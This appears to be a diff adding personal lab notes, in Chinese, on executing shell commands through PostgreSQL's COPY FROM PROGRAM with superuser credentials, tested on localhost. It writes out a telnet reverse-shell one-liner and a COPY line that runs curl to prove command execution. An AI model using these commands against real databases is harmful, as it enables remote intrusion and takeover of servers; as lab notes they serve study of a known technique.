@@ -1,0 +1,19 @@
+PostgreSQL 9.3以上有多了一个执行命令的功能，要求需要超级用户的账号密码
+https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5
+
+测试：
+
+initdb /Users/komi/Desktop/rce_postgresql -E utf8
+pg_ctl -D /Users/komi/Desktop/rce_postgresql -l logfile start
+createuser test -P
+psql -U test -d psqlDev -h 127.0.0.1
+
+
+sh -c ''(sleep 4589|telnet 127.0.0.1 4444|while : ; do sh && break; done 2>&1|telnet 127.0.0.1 4444 >/dev/null 2>&1 &)''
+
+CREATE TABLE testss(id int, text VARCHAR(50));
+
+CREATE TABLE msftesttable(filename text);
+重点在这里
+COPY msftesttable FROM PROGRAM 'curl -vv http://127.0.0.1:8000/xxx_rce_postgre';
+
